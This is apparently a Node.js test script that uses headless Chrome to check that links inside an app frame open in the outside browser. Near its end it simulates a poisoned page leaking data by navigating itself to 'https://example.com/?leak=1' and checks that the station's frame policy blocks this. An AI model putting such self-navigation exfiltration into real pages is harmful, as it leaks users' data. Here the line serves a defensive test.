// APPS — a link in an app opens in the real browser, never inside the app frame (2026-09-30).
//   node dev/apps-link-proof.mjs [port] [appId]     against a RUNNING station that has the app (default 8871, ai-news-brief)
// Andrew clicked a story in the crew-built AI News Brief and the article tried to load INSIDE the app window
// ("fedscoop.com refused to connect"): the page's inline onclick was broken, so the plain href navigated the frame.
// The kit now catches every outside link in capture. Proof: click the first story link inside the real app frame —
// the frame must stay on its own page, and the station must be asked to open the https URL outside.
import { mkdtempSync, rmSync, mkdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { spawn } from 'node:child_process';
import { findChrome, connectCDP, evalJS, capture, sleep } from '../scripts/lib/cdp.mjs';

const PORT = Number(process.argv[2] || 8871), APP = process.argv[3] || 'ai-news-brief', CDP_PORT = 9498;
const out = '.worldshots/apps-link';
mkdirSync(out, { recursive: true });
const scratch = mkdtempSync(join(tmpdir(), 'starnet-apps-link-'));
let chrome, cdp, failed = 0;
const run = (s) => evalJS(cdp, s);
const check = (name, ok) => { console.log((ok ? 'PASS ' : 'FAIL ') + name); if (!ok) failed++; };
const contexts = new Map();
async function frameInfo() {
  const tree = await cdp.send('Page.getFrameTree');
  return (tree.frameTree.childFrames || []).map((c) => c.frame).filter((f) => /\/app-ui\//.test(f.url) || /fedscoop|https:\/\/(?!127)/.test(f.url));
}
async function inFrame(expression) {
  const [f] = await frameInfo();
  const r = await cdp.send('Runtime.evaluate', { expression, contextId: contexts.get(f.id), awaitPromise: true, returnByValue: true });
  if (r.exceptionDetails) throw Error(r.exceptionDetails.text);
  return r.result && r.result.value;
}
try {
  chrome = spawn(findChrome(), ['--headless=new', '--no-first-run', '--no-default-browser-check', '--hide-scrollbars', '--mute-audio',
    '--disable-features=IsolateSandboxedIframes,site-per-process', '--remote-debugging-port=' + CDP_PORT, '--window-size=1440,900', '--user-data-dir=' + join(scratch, 'chrome'), 'about:blank'], { stdio: 'ignore', windowsHide: true });
  cdp = await connectCDP(CDP_PORT);
  cdp.on('Runtime.executionContextCreated', (e) => { const a = e.context.auxData || {}; if (a.isDefault && a.frameId) contexts.set(a.frameId, e.context.id); });
  await cdp.send('Runtime.enable'); await cdp.send('Page.enable');
  await cdp.send('Emulation.setDeviceMetricsOverride', { width: 1440, height: 900, deviceScaleFactor: 1, mobile: false });
  await cdp.send('Page.navigate', { url: 'http://127.0.0.1:' + PORT + '/' });
  for (let i = 0; i < 60; i++) { try { if (await run(`typeof AppsUI === 'object' && typeof PluginHost === 'object'`)) break; } catch {} await sleep(500); }
  // record what the station is asked to open outside (the plain web page's openExternal = window.open)
  await run(`window.__opened = []; window.open = (u) => { window.__opened.push(String(u)); return null; }; true`);
  await run(`AppsUI.load().then(() => { const a = AppsUI.list ? AppsUI.list().find(x => x.id === ${JSON.stringify(APP)}) : null; PluginHost.openApp(a || { id: ${JSON.stringify(APP)} }); return true; })`);
  for (let i = 0; i < 90; i++) { try { if (await inFrame(`!!document.querySelector('a[href^="http"]')`)) break; } catch {} await sleep(500); }
  const before = (await frameInfo())[0].url;
  const target = await inFrame(`(() => { const a = document.querySelector('a[href^="http"]'); a.click(); return a.getAttribute('href'); })()`);
  await sleep(1500);
  const after = (await frameInfo())[0].url;
  const opened = await run(`window.__opened`);
  check('the story link is an outside https link: ' + target, /^https:\/\//.test(target || ''));
  check('the app frame stayed on its own page (never navigated to the article)', after === before && /\/app-ui\//.test(after));
  check('the station opened the article outside: ' + JSON.stringify(opened), opened.length === 1 && opened[0] === new URL(target).href);
  // the page tries to LEAVE (a poisoned page exfiltrating by navigating itself): the station page's frame-src refuses it
  await inFrame(`(() => { setTimeout(() => { location.href = 'https://example.com/?leak=1'; }, 50); return true; })()`);
  await sleep(2500);
  const tree = await cdp.send('Page.getFrameTree');
  const urls = (tree.frameTree.childFrames || []).map((c) => c.frame.url);
  check('a page that navigates ITSELF to the web is blocked (no frame reached example.com): ' + JSON.stringify(urls.map(u => u.slice(0, 40))), !urls.some(u => /example.com/.test(u)));
  await capture(cdp, out, 'after-click');
} catch (e) { console.error(String((e && e.stack) || e)); failed++; }
finally {
  try { cdp?.ws.close(); } catch {}
  chrome?.kill();
  setTimeout(() => { try { rmSync(scratch, { recursive: true, force: true }); } catch {} process.exit(failed ? 1 : 0); }, 800);
}
